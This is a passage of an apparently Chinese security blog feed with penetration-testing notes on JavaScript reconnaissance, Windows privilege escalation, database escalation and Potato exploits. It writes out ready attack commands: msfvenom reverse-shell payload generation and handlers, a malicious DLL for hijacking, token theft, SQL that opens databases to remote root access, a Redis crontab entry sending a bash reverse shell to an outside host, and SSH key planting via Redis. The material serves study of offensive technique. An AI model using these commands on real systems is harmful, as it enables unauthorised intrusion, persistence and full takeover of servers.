        <content type="html"><![CDATA[<h1 id="信息收集-1"><a href="#信息收集-1" class="headerlink" title="信息收集-1"></a>信息收集-1</h1><h2 id="CMS-指纹识别"><a href="#CMS-指纹识别" class="headerlink" title="CMS 指纹识别"></a>CMS 指纹识别</h2><p>在线 cms 指纹识别：<a href="http://whatweb.bugscaner.com/look/">http://whatweb.bugscaner.com/look/</a></p><p>Wappalyzer：<a href="https://github.com/AliasIO/wappalyzer">https://github.com/AliasIO/wappalyzer</a></p><p>TideFinger 潮汐：<a href="http://finger.tidesec.net/">http://finger.tidesec.net/</a></p><p>云悉指纹：<a href="https://www.yunsee.cn/">https://www.yunsee.cn/</a></p><p>WhatWeb：GitHub – urbanadventurer&#x2F;WhatWeb: Next generation web scanner</p><p>数字观星 Finger-P：<a href="https://fp.shuziguanxing.com/#/">https://fp.shuziguanxing.com/#/</a></p><h2 id="后端-闭源-配置不当-源码泄漏"><a href="#后端-闭源-配置不当-源码泄漏" class="headerlink" title="后端 - 闭源 - 配置不当 - 源码泄漏"></a>后端 - 闭源 - 配置不当 - 源码泄漏</h2><p>参考：<a href="https://www.secpulse.com/archives/124398.html">https://www.secpulse.com/archives/124398.html</a></p><p>备份：敏感目录文件扫描</p><p>CVS：<a href="https://github.com/kost/dvcs-ripper">https://github.com/kost/dvcs-ripper</a></p><p>GIT：<a href="https://github.com/lijiejie/GitHack">https://github.com/lijiejie/GitHack</a></p><p>SVN：<a href="https://github.com/callmefeifei/SvnHack">https://github.com/callmefeifei/SvnHack</a></p><p>DS_Store：<a href="https://github.com/lijiejie/ds_store_exp">https://github.com/lijiejie/ds_store_exp</a></p><p>composer.json：php 中，composer.json, 它描述了组件的信息: 名称 , 描述 , 关键词 , 作者 , GitHub 仓库地址…</p><p>git 源码泄露，svn 源码泄露，hg 源码泄漏，网站备份压缩文件，WEB-INF&#x2F;web.xml 泄露，DS_Store 文件泄露，SWP 文件泄露，CVS 泄露，Bzr 泄露，GitHub 源码泄漏</p><p>有些小公司，或者黑色产业，会使用网上的源码进行搭建自己的 app 等，对网上的源码进行比对</p><p><a href="https://tool.chinaz.com/Default.aspx/">站长服务中心 — 网络维护服务市场，身边的技术服务顾问 – 互站网</a></p><h2 id="什么是-JS-渗透测试？"><a href="#什么是-JS-渗透测试？" class="headerlink" title="什么是 JS 渗透测试？"></a>什么是 JS 渗透测试？</h2><p>在 Javascript 中也存在变量和函数，当存在可控变量及函数调用即可参数漏洞</p><p>JS 开发的 WEB 应用和 PHP，JAVA,NET 等区别在于即没有源代码，也可以通过浏览器的</p><p>查看源代码获取真实的点。获取 URL，获取 JS 敏感信息，获取代码传参等，所以相当于</p><p>JS 开发的 WEB 应用属于白盒测试（默认有源码参考），一般会在 JS 中寻找更多的 URL</p><p>地址，在 JS 代码逻辑（加密算法，APIkey 配置，验证逻辑等）进行后期安全测试。</p><h2 id="JS-安全问题"><a href="#JS-安全问题" class="headerlink" title="JS 安全问题"></a>JS 安全问题</h2><p><strong>源码泄漏</strong></p><p>未授权访问 &#x3D; JS 里面分析更多的 URL 访问确定接口路径</p><p>敏感 key 泄漏 &#x3D; JS 文件中可能配置了接口信息（云应用，短信，邮件，数据库等）</p><p>API 接口安全 &#x3D;（代码中加密提交参数传递，更多的 URL 路径）</p><p><strong>手工分析模式：</strong><br>1，先用 network 2，用 wappalyzer 查看框架 3，只看 js（vue.js) 4,看 admin&#x2F;login 等这种 5,ctrl + shift +f 搜索获取价值信息。</p><p><strong>快速获取价值信息</strong><br>src&#x3D;</p><p>path&#x3D;</p><p>method&#x3D;”get”、method&#x3D;”post”</p><p>http.get(“、http.post(“</p><p>$.ajax</p><p><a href="http://service.httpget/">http://service.httpget</a></p><p><a href="http://service.httppost/">http://service.httppost</a></p><p><strong>JS 前端架构 — 半自动 Burp</strong><br>官方插件：JS Link Finder &amp; JS Miner</p><p>第三方插件：HaE &amp; Unexpected_information</p><p>Unexpected_information：<a href="https://github.com/ScriptKid-Beta/Unexpected_information">https://github.com/ScriptKid-Beta/Unexpected_information</a></p><p>用来标记请求包中的一些敏感信息、JS 接口和一些特殊字段，<br>防止我们疏忽了一些数据包，使用它可能会有意外的收获信息。</p><p>HaE：<a href="https://github.com/gh0stkey/HaE">https://github.com/gh0stkey/HaE</a></p><p>基于 BurpSuite 插件 JavaAPI 开发的请求高亮标记与信息提取的辅助型插件。该插件可以通过自定义正则的方式匹配响应报文或请求报文，可以自行决定符合该自定义正则匹配的相应请求是否需要高亮标记、信息提取。</p><p>JS 网络扫描工具：JSFinder，URLFinder，ffuf-FUZZ，Packer-Fuzzer，Findsomething</p><p>1，JSFinder: 一款用作快速在网站的 js 文件中提取 URL，子域名的工具。</p><p><a href="https://github.com/Threezh1/JSFinder">https://github.com/Threezh1/JSFinder</a></p><p>2，URLFinder: 更专注于提取页面中的 JS 与 URL 链接，提取的数据更完善且可查看状态码、内容大小、标题等</p><p><a href="https://github.com/pingc0y/URLFinder">https://github.com/pingc0y/URLFinder</a></p><pre><code>URLFinder.exe -u http://www.baidu.com -s all -m 2</code></pre><p>3，ffuf-FUZZ：爆破找到更多的 js 文件分析更多的信息<br><a href="https://github.com/ffuf/ffuf">https://github.com/ffuf/ffuf</a></p><p><a href="https://wordlists.assetnote.io/">https://wordlists.assetnote.io</a> （下载字典网址）<br>功能强大的模糊化工具，用它来 FUZZ 模糊化 js 文件。</p><pre><code>ffuf.exe -w 字典.txt -u &lt;域名&gt;/FUZZ -t 200 -of csv -o 2.csv</code></pre><p>4，Packer-Fuzzer：一款针对 Webpack 等前端打包工具所构造的网站进行快速、高效安全检测的扫描工具。</p><p><a href="https://github.com/rtcatc/Packer-Fuzzer">https://github.com/rtcatc/Packer-Fuzzer</a></p><p>5，Findsomething：从表现中 JS 中提取 URL 或者敏感数据（包括请求的资源、接口的 url，请求的 ip 和域名，泄漏的证件号、手机号、邮箱等信息。）</p><p><a href="https://github.com/momosecurity/FindSomething">https://github.com/momosecurity/FindSomething</a></p><p><img src="https://myhaoblog.oss-cn-beijing.aliyuncs.com/blog%20%E5%9B%BE%E7%89%87/%E5%9B%BE%E7%89%87-18-1.png" alt="RUNOOB 属性文本"></p>]]></content>
      
      
      <categories>
          
          <category> 基础知识 </category>
          
      </categories>
      
      
        <tags>
            
            <tag> 基础 </tag>
            
        </tags>
      
    </entry>
    
    
    
    <entry>
      <title>权限提升-3-Win提权</title>
      <link href="/2025/06/17/%E6%9D%83%E9%99%90%E6%8F%90%E5%8D%87-3/"/>
      <url>/2025/06/17/%E6%9D%83%E9%99%90%E6%8F%90%E5%8D%87-3/</url>
      
        <content type="html"><![CDATA[<h1 id="权限提升-3"><a href="#权限提升-3" class="headerlink" title="权限提升-3"></a>权限提升-3</h1><h2 id="Win提权"><a href="#Win提权" class="headerlink" title="Win提权"></a>Win提权</h2><h3 id="服务启动"><a href="#服务启动" class="headerlink" title="服务启动"></a>服务启动</h3><p>sc是用于与服务控制管理器和服务进行通讯的命令行程序。<br>使用版本:windows 7,10,08,12,16,19,22,早期用at命令<br>1，创建一个名叫syscmd的执行文件</p><figure class="highlight abnf"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">sc Create syscmd binPath<span class="operator">=</span><span class="string">&quot;C:\msf.exe&quot;</span></span><br></pre></td></tr></table></figure><p>2,运行服务</p><figure class="highlight powershell"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line"><span class="built_in">sc</span> <span class="built_in">start</span> syscmd</span><br></pre></td></tr></table></figure><h3 id="Psexec提权"><a href="#Psexec提权" class="headerlink" title="Psexec提权"></a>Psexec提权</h3><p>（适用于 Win2003 &amp; Win2008）<br>Psexec是Systinternals出品的强大工具，可以让你在远程系统上执行命令<br>下载地址：<br><a href="https://download.sysinternals.com/files/PSTools.zip">https://download.sysinternals.com/files/PSTools.zip</a></p><figure class="highlight stylus"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">psexec -<span class="selector-tag">i</span> -s -d cmd #以system权限运行cmd</span><br><span class="line">psexec<span class="selector-class">.exe</span> -accepteula -<span class="selector-tag">i</span> -s -d cmd<span class="selector-class">.exe</span> #加上-accepteula参数，避免弹出许可协议</span><br></pre></td></tr></table></figure><h3 id="进程注入"><a href="#进程注入" class="headerlink" title="进程注入"></a>进程注入</h3><p>MSF：</p><figure class="highlight 1c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">ps <span class="comment">//查看进程</span></span><br><span class="line">migrate PID <span class="comment">//迁移对应PID</span></span><br></pre></td></tr></table></figure><p>CS:</p><figure class="highlight gradle"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">ps <span class="comment">//查看进程</span></span><br><span class="line"><span class="keyword">inject</span> PID <span class="comment">//注入对应PID</span></span><br></pre></td></tr></table></figure><h3 id="令牌窃取"><a href="#令牌窃取" class="headerlink" title="令牌窃取"></a>令牌窃取</h3><p>MSF：</p><figure class="highlight actionscript"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">use</span> incognito</span><br><span class="line">list_tokens -u</span><br><span class="line">impersonate_token <span class="string">&quot;NT AUTHORITY\SYSTEM&quot;</span></span><br></pre></td></tr></table></figure><p>CS:</p><figure class="highlight 1c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line">ps <span class="comment">//查看进程</span></span><br><span class="line">steal_token PID <span class="comment">//窃取进程令牌</span></span><br><span class="line">spawnu PID <span class="comment">//窃取进程令牌上线</span></span><br></pre></td></tr></table></figure><h3 id="UAC绕过"><a href="#UAC绕过" class="headerlink" title="UAC绕过"></a>UAC绕过</h3><p>1，MSF模块</p><p>2，UACME项目<br><a href="https://github.com/hfiref0x/UACME">https://github.com/hfiref0x/UACME</a><br>Akagi64.exe 编号 调用执行</p><h3 id="DLL劫持"><a href="#DLL劫持" class="headerlink" title="DLL劫持"></a>DLL劫持</h3><p>在掌握的权限中，需要知道有哪些应用，应用知道后怎么分析调用的dll，尝试对dll文件进行覆盖，程序被执行后就会调用覆盖的dll</p><p>原理：Windows程序启动的时候需要DLL。如果这些DLL不存在，则通过在应用程序要查找的位置放置恶意DLL来提权。通常，Windows应用程序有其预定好的搜索DLL的路径，它会根据下面顺序进行搜索：<br>1，应用程序加载的目录<br>2，C:\Windows\System32<br>3，C:\Windows\System<br>4，C:\Windows<br>5，当前工作目录Currnet Working Directory，CWD<br>6，在PATH环境变量的目录（先系统后用户）<br>过程：信息收集-进程调试-制作dll并上传-替换dll-等待启动应用成功<br>检测调用的dll文件：ChkDllHijack 火绒剑<br>项目：<a href="https://github.com/anhkgg/anhkgg-tools">https://github.com/anhkgg/anhkgg-tools</a><br>利用火绒剑进行进程分析加载DLL，一般寻程序DLL利用。<br>msfvenom -p windows&#x2F;meterpreter&#x2F;reverse_tcp lhost&#x3D;xx.xx.xx.xx  lport&#x3D;xx -f dll -o msf.dll<br>将msf.dll替换成应用程序调用的dll文件，后重新启动应用（更偏向于钓鱼）</p><h3 id="未引导号路径"><a href="#未引导号路径" class="headerlink" title="未引导号路径"></a>未引导号路径</h3><p>如果一个服务的可执行文件的路径没有被双引号引起来且包含空格，那么这个服务就是有漏洞的！<br>漏洞原理<br>假设服务路径是：C:\Program Files (x86)\Common Files\Tencent\QQMusic\QQMusicService.exe</p><ul><li>带引号时： “C:\Program Files (x86)\Common Files\Tencent\QQMusic\QQMusicService.exe”会被看成一个完整的服务路径，没有漏洞。</li><li>不带引号时： Windows会认为C:\Program空格后面的为Program这个程序的参数，导致攻击者可以创建一个名为Program.exe的后门文件放在C盘下，等待服务启动时执行。<br>漏洞检测</li></ul><figure class="highlight shell"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">wmic service get name,displayname,pathname,startmode | findstr /i &quot;Auto&quot; | findstr /i /v &quot;C:Windows\&quot; | findstr /i /v &quot;&quot;&quot;</span><br></pre></td></tr></table></figure><h3 id="可控服务"><a href="#可控服务" class="headerlink" title="可控服务"></a>可控服务</h3>]]></content>
      
      
      <categories>
          
          <category> Win权限提升 </category>
          
      </categories>
      
      
        <tags>
            
            <tag> Win提升 </tag>
            
        </tags>
      
    </entry>
    
    
    
    <entry>
      <title>权限提升-2</title>
      <link href="/2025/06/17/%E6%9D%83%E9%99%90%E6%8F%90%E5%8D%87-2/"/>
      <url>/2025/06/17/%E6%9D%83%E9%99%90%E6%8F%90%E5%8D%87-2/</url>
      
        <content type="html"><![CDATA[<h1 id="权限提升-2"><a href="#权限提升-2" class="headerlink" title="权限提升-2"></a>权限提升-2</h1><h2 id="数据库提权"><a href="#数据库提权" class="headerlink" title="数据库提权"></a>数据库提权</h2><p>数据库提权流程：</p><h3 id="1、先获取到数据库用户密码"><a href="#1、先获取到数据库用户密码" class="headerlink" title="1、先获取到数据库用户密码"></a>1、先获取到数据库用户密码</h3><ul><li>网站存在SQL注入漏洞</li><li>数据库的存储文件或备份文件</li><li>网站应用源码中的数据库配置文件</li><li>采用工具或脚本爆破(需解决外联问题)</li></ul><h3 id="2、利用数据库提权项目进行连接"><a href="#2、利用数据库提权项目进行连接" class="headerlink" title="2、利用数据库提权项目进行连接"></a>2、利用数据库提权项目进行连接</h3><p>工具提权：<br>MDUT<br>Databasetools<br>RequestTemplate<br><a href="https://github.com/SafeGroceryStore/MDUT">https://github.com/SafeGroceryStore/MDUT</a><br><a href="https://github.com/Hel10-Web/Databasetools">https://github.com/Hel10-Web/Databasetools</a><br><a href="https://github.com/1n7erface/RequestTemplate">https://github.com/1n7erface/RequestTemplate</a></p><h3 id="3、可利用建立代理解决不支持外联"><a href="#3、可利用建立代理解决不支持外联" class="headerlink" title="3、可利用建立代理解决不支持外联"></a>3、可利用建立代理解决不支持外联</h3><ul><li>利用已知Web权限建立代理（等同于本地连接）</li><li>利用已知权限执行SQL开启外联（让数据库支持外联）</li></ul><p><strong>mysql</strong></p><figure class="highlight shell"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">GRANT ALL PRIVILEGES ON *.* TO &#x27;帐号&#x27;@&#x27;%&#x27; IDENTIFIED BY &#x27;密码&#x27; WITH GRANT OPTION;</span><br><span class="line">flush privileges;</span><br></pre></td></tr></table></figure><p><strong>mssql</strong></p><figure class="highlight shell"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><span class="line">EXEC sp_configure &#x27;show advanced options&#x27;, 1;</span><br><span class="line">RECONFIGURE;</span><br><span class="line">EXEC sp_configure &#x27;Ad Hoc Distributed Queries&#x27;, 1;</span><br><span class="line">RECONFIGURE;</span><br></pre></td></tr></table></figure><p><strong>oracle</strong></p><figure class="highlight shell"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line">ALTER SYSTEM SET REMOTE_LOGIN_PASSWORDFILE=EXCLUSIVE SCOPE=SPFILE;</span><br><span class="line">SHUTDOWN IMMEDIATE;</span><br><span class="line">STARTUP;</span><br></pre></td></tr></table></figure><h3 id="4、可利用数据库提权类型条件及技术"><a href="#4、可利用数据库提权类型条件及技术" class="headerlink" title="4、可利用数据库提权类型条件及技术"></a>4、可利用数据库提权类型条件及技术</h3><ul><li><p>MYSQL：PHP+MYSQL 以web入口提权<br>条件：ROOT密码（高版本的-secure-file-priv没进行目录限制）<br>技术：UDF MOF 启动项 反弹Shell</p></li><li><p>MSSQL：.NET+MSSQL 以web入口提权<br>条件：sa密码<br>技术：xp_cmdshell sp_oacreate CLR 沙盒</p></li><li><p>Oracle:(站库分离，非JSP，直接数据库到系统等)<br>条件：数据库用户密码<br>技术：DBA。普通用户，注入模式</p></li><li><p>PostgreSQL<br>Web到系统<br>条件：数据库库用户密码<br>技术：CVE-2019-9193 UDF libc<br>提权原理：</p></li></ul><figure class="highlight shell"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><span class="line">DROP TABLE IF EXISTS cmd_exec;</span><br><span class="line">CREATE TABLE cmd_exec(cmd_output test);</span><br><span class="line">COPY cmd_exec FROM PROGRAM &#x27;id&#x27;;</span><br><span class="line">SELECT * FROM cmd_exec;</span><br></pre></td></tr></table></figure><ul><li>Redis<br>数据库到linux<br>条件：利用未授权或密码连接后执行</li></ul><p>1，定时任务反弹shell<br>利用条件：Redis服务使用ROOT账号启动，安全模式protected-mode处于关闭状态</p><figure class="highlight shell"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><span class="line">config set dir /var/spool/cron</span><br><span class="line">set yy &quot;\n\n\n* * * * * bash -i &gt;&amp; /dev/tcp/ip/端口 0&gt;&amp;1\n\n\n&quot;</span><br><span class="line">config set dbfilename x</span><br><span class="line">save</span><br></pre></td></tr></table></figure><p>注意：Centos会忽略乱码取执行格式正确的任务计划，而ubuntu并不会忽略这些代码，所有导致命令执行失败</p><p>2，写入Linux ssh-key公钥<br>利用条件：Redis服务使用ROOT账号启动，安全模式protected-mode处于关闭状态<br>允许使用密钥登录，即可以远程写入公钥，直接登录远程服务器</p><figure class="highlight shell"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><span class="line">ssh-keygen -t rsa</span><br><span class="line">cd /root/.ssh/</span><br><span class="line">(echo -e &quot;\n\n&quot;; cat id_rsa.pub; echo -e &quot;\n\n&quot;)</span><br><span class="line">cat key.txt | redis-cli -h 目标IP -x set xxx</span><br></pre></td></tr></table></figure><p>&#x2F;&#x2F;上述步骤在自己的攻击机器上执行</p><figure class="highlight shell"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line">config set dir /root/.ssh/</span><br><span class="line">config set dbfilename authorized_keys</span><br><span class="line">save</span><br></pre></td></tr></table></figure><ul><li>Memcached<br>数据库到linux<br>条件：设置远程可访问或取得本地权限后访问</li></ul><p>是一套常用的key-value缓存系统，由于它本身没有权限控制模块，<br>服务被攻击者发现，通过命令交互可以直接读取memcached中的敏感信息。</p>]]></content>
      
      
      <categories>
          
          <category> 权限提升 </category>
          
      </categories>
      
      
        <tags>
            
            <tag> 权限提升 </tag>
            
        </tags>
      
    </entry>
    
    
    
    <entry>
      <title>权限提升-1</title>
      <link href="/2025/06/17/%E6%9D%83%E9%99%90%E6%8F%90%E5%8D%87-1/"/>
      <url>/2025/06/17/%E6%9D%83%E9%99%90%E6%8F%90%E5%8D%87-1/</url>
      
        <content type="html"><![CDATA[<h1 id="权限提升-1"><a href="#权限提升-1" class="headerlink" title="权限提升-1"></a>权限提升-1</h1><p><strong>1、Web语言权限差异</strong><br>ASP&#x2F;ASP.NET&#x2F;PHP&#x2F;JSP等<br>权限高低：JSP&gt;ASP.NET&gt;ASP&#x3D;PHP<br>使用了java搭建的可以不需要提权，而php需要提权</p><p><strong>2、系统用户权限差异</strong><br>Windows：<br>System：系统组，拥有管理系统资源的权限，包括文件、目录和注册表等。<br>Administrators：管理员组，具有对计算机进行完全访问和操作的权限。<br>Users：用户组，一般用户的默认组别，拥有较低的系统权限。<br>Guests：<br>访客组，可以访问计算机上的公共文件夹和打印机，但不能更改配置和安装程序。<br>Backup Operators：<br>备份操作员组，允许用户备份和还原数据，但不能更改配置安装程序。<br>Power Users：高级用户组，拥有比一般用户更高的系统权限，但比管理员组权限低。<br>Remote Desktop Users：远程桌面用户组，允许用户进行远程桌面连接。<br>Network Configuration Operators：网络配置操作员组，允许用户管理网络配置。<br>Performance Log Users：性能日志用户组，允许用户收集性能日志和计数器数据。<br>Distributed COM Users：<br>分布式 COM 用户组，允许用户使用分布式 COM 连接到计算机。<br>IIS_IUSRS: 用于授权IIS相关服务的用户组。</p><p>Linux：<br>系统用户：UID(0-999)<br>普通用户：UID(1000-*)<br>root用户：UID为0，拥有系统的完全控制权限</p><h2 id="Web到Win-系统提权-MSF-CS"><a href="#Web到Win-系统提权-MSF-CS" class="headerlink" title="Web到Win-系统提权-MSF&amp;CS"></a>Web到Win-系统提权-MSF&amp;CS</h2><p><strong>msf</strong></p><p>1、生成反弹后门</p><figure class="highlight shell"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">msfvenom -p windows/meterpreter/reverse_tcp LHOST=192.168.139.141 LPORT=3333 -f exe -o msf.exe</span><br></pre></td></tr></table></figure><p>2、配置监听会话</p><figure class="highlight shell"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><span class="line">use exploit/multi/handler</span><br><span class="line">set payload windows/meterpreter/reverse_tcp</span><br><span class="line">set lhost 0.0.0.0</span><br><span class="line">set lport 3333</span><br><span class="line">exploit</span><br></pre></td></tr></table></figure><p>2.1、筛选EXP模块<br>全自动：快速识别系统中可能被利用的漏洞</p><figure class="highlight shell"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">use post/multi/recon/local_exploit_suggester</span><br><span class="line">set showdescription true</span><br></pre></td></tr></table></figure><p>3、利用EXP溢出提权</p><figure class="highlight shell"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><span class="line">background</span><br><span class="line">use exploit/windows/local/ms16_075_reflection_juicy</span><br><span class="line">set session 1</span><br><span class="line">exploit</span><br></pre></td></tr></table></figure><p><strong>CS</strong></p><figure class="highlight shell"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line">chmod +x ./teamserver</span><br><span class="line">chmod +x ./TeamServerImage</span><br><span class="line">./teamserver IP password</span><br></pre></td></tr></table></figure><p>1,创建CS<br>2，创建监听器<br>3，加载脚本插件</p><p><strong>手动检测工具：</strong></p><p>wes-ng<br><a href="https://github.com/bitsadmin/wesng">https://github.com/bitsadmin/wesng</a></p><p>WES-NG 是一款基于 Windows 实用程序输出的工具systeminfo，它提供操作系统易受攻击的漏洞列表，以及针对这些漏洞的任何利用方法。该工具支持 Windows XP 到 Windows 11 之间的所有 Windows 操作系统，包括其对应的 Windows Server 版本。</p><figure class="highlight shell"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">pip install wesng</span><br></pre></td></tr></table></figure><p>或使用以下命令行下载 WES-NG ：</p><figure class="highlight shell"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">git clone https://github.com/bitsadmin/wesng --depth 1</span><br></pre></td></tr></table></figure><p>执行命令获取最新的漏洞数据库</p><figure class="highlight stylus"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">wes<span class="selector-class">.py</span> <span class="attr">--update</span></span><br></pre></td></tr></table></figure><p>通过获取对方系统的systeminfo内容，将内容给与wes.py执行查询可能存在的权限提升</p><p><a href="https://github.com/Ascotbe/Kernelhub">https://github.com/Ascotbe/Kernelhub</a><br><a href="https://github.com/nomi-sec/PoC-in-GitHub">https://github.com/nomi-sec/PoC-in-GitHub</a><br><a href="https://www.exploit-db.com/">https://www.exploit-db.com/</a></p><h2 id="土豆家族："><a href="#土豆家族：" class="headerlink" title="土豆家族："></a>土豆家族：</h2><p>土豆提权原理:</p><p>  土豆系列提权的核心是NTLM中继，通过欺骗运行在高权限（Administrator&#x2F;SYSTEM）的账户进行ntlm认证，同时作为中间人对认证过程进行劫持和重放，最后调用本地认证接口使用高权限账号的ntml认证获取一个高权限token，只要当前进程拥有SeImpersonatePrivilege权限即可进行令牌模仿，即可取得对应权限。<br><a href="https://mp.weixin.qq.com/s/OW4ybuqtErh_ovkTWLSr8w">https://mp.weixin.qq.com/s/OW4ybuqtErh_ovkTWLSr8w</a></p><h3 id="GodPotato："><a href="#GodPotato：" class="headerlink" title="GodPotato："></a>GodPotato：</h3><p><a href="https://github.com/BeichenDream/GodPotato">https://github.com/BeichenDream/GodPotato</a></p><p>DCOM rpcss在处理ox时存在一些缺陷，rpcss是系统必须开启的服务，所以它几乎可以运行在任何Windows操作系统上。<br>作用范围：Windows Server 2012 - Windows Server 2022、Windows8 - Windows 11</p><h3 id="SweetPotato："><a href="#SweetPotato：" class="headerlink" title="SweetPotato："></a>SweetPotato：</h3><p><a href="https://github.com/CCob/SweetPotato">https://github.com/CCob/SweetPotato</a><br>作用范围：从Windows 7到Windows 10 &#x2F; Server 2019</p><h3 id="RoguePotato："><a href="#RoguePotato：" class="headerlink" title="RoguePotato："></a>RoguePotato：</h3><p><a href="https://github.com/antonioCoco/RoguePotato">https://github.com/antonioCoco/RoguePotato</a></p><p>Rogue Potato通过指定远程 IP(攻击者 IP)指示 DCOM 服务器执行远程 OXID 查询在远程 IP 上，设置一个”socat”侦听器，用于将 OXID 解析请求重定向到一个假的OXID RPC 服务器伪造的OXID RPC 服务器实现了ResolveOxid2服务器过程；该过程将指向受控命名管道[ncacn_np:localhost&#x2F;pipe&#x2F;roguepotato[pipeepmapper]DCOM 服务器将连接到 RPC 服务器以执行IRemUnkown2接口调用。通过连接到命名管道，将执行”身份验证回调”，我们可以通过 RpcImpersonateClient()调用模拟调用者。</p><p>作用范围：Win 10(部分版本)和Win Server 19</p><h3 id="BadPotato："><a href="#BadPotato：" class="headerlink" title="BadPotato："></a>BadPotato：</h3><p><a href="https://github.com/BeichenDream/BadPotato">https://github.com/BeichenDream/BadPotato</a><br>利用了一个打印机bug，通过调用RpcRemoteFindFirstPrinterChangeNotificationEx让打印机服务通过命名管道发送通知，强行使SYSTEM连接到目标命名管道，然后通过如上介绍的方法直接获取到SYSTEM权限<br>作用范围：Windows 2012-2019、Windows 8-10</p><h3 id="EfsPotato："><a href="#EfsPotato：" class="headerlink" title="EfsPotato："></a>EfsPotato：</h3><p><a href="https://github.com/zcgonvh/EfsPotato">https://github.com/zcgonvh/EfsPotato</a><br>利用MS-EFSR EfsRpcEncryptFileSrv带有 SeImpersonatePrivilege 本地权限升级漏洞<br>作用范围：未知</p><h3 id="MultiPotato："><a href="#MultiPotato：" class="headerlink" title="MultiPotato："></a>MultiPotato：</h3><p><a href="https://github.com/S3cur3Th1sSh1t/MultiPotato">https://github.com/S3cur3Th1sSh1t/MultiPotato</a><br>作用范围：未知</p><h3 id="CandyPotato："><a href="#CandyPotato：" class="headerlink" title="CandyPotato："></a>CandyPotato：</h3><p><a href="https://github.com/klezVirus/CandyPotato">https://github.com/klezVirus/CandyPotato</a><br>0.2 版JuicyPotato。与0.1版本（JuicyPotato）相比，该版本提供了一些改进，例如自动化利用。</p><p>作用范围：win10和server2016</p><h3 id="RasmanPotato"><a href="#RasmanPotato" class="headerlink" title="RasmanPotato:"></a>RasmanPotato:</h3><p><a href="https://github.com/crisprss/RasmanPotato">https://github.com/crisprss/RasmanPotato</a><br>只是另一个土豆，就像其他土豆一样，使用 RasMan 服务进行权限升级</p><p>作用范围：Windows 10(11 not test), Windows Server 2012 - 2019(2022 not test)</p><h3 id="PetitPotato"><a href="#PetitPotato" class="headerlink" title="PetitPotato:"></a>PetitPotato:</h3><p><a href="https://github.com/wh0amitz/PetitPotato">https://github.com/wh0amitz/PetitPotato</a><br>通过 PetitPotam 进行本地权限升级（滥用模拟权限）。<br>作用范围：未知</p><h3 id="JuicyPotatoNG"><a href="#JuicyPotatoNG" class="headerlink" title="JuicyPotatoNG:"></a>JuicyPotatoNG:</h3><p><a href="https://github.com/antonioCoco/JuicyPotatoNG">https://github.com/antonioCoco/JuicyPotatoNG</a><br>利用PrintNotify COM服务进行提权。</p><p>作用范围：Windows 10 - 11 Windows Server 2012 - 2022</p><h3 id="PrintNotifyPotato"><a href="#PrintNotifyPotato" class="headerlink" title="PrintNotifyPotato:"></a>PrintNotifyPotato:</h3><p><a href="https://github.com/BeichenDream/PrintNotifyPotato">https://github.com/BeichenDream/PrintNotifyPotato</a><br>原理：又一个土豆，利用PrintNotify COM服务进行提权，跟JuicyPotatoNG实现相同，只不过JuicyPotatoNG是用c++实现的，而PrintNotifyPotato是用c#实现的。</p><p>作用范围：Windows 10 - 11 Windows Server 2012 - 2022</p><h3 id="CoercedPotato"><a href="#CoercedPotato" class="headerlink" title="CoercedPotato:"></a>CoercedPotato:</h3><p><a href="https://github.com/Prepouce/CoercedPotato">https://github.com/Prepouce/CoercedPotato</a><br>在 Windows 10、Windows 11 和 Server 2022 上通过滥用 SeImpersonatePrivilege 从 Patate（本地&#x2F;网络服务）到 SYSTEM。</p><p>作用范围：Windows 10 - 11 Windows Server 2012 - 2022</p>]]></content>
      
      
      <categories>
          
          <category> 权限提升 </category>
          
      </categories>
      
      
        <tags>
            
            <tag> 权限提升 </tag>
            
        </tags>
      
    </entry>
    
    
    
    <entry>
      <title>内网-信息收集</title>
      <link href="/2025/06/17/%E5%86%85%E7%BD%91%E6%94%BB%E9%98%B2-2/"/>
      <url>/2025/06/17/%E5%86%85%E7%BD%91%E6%94%BB%E9%98%B2-2/</url>
      
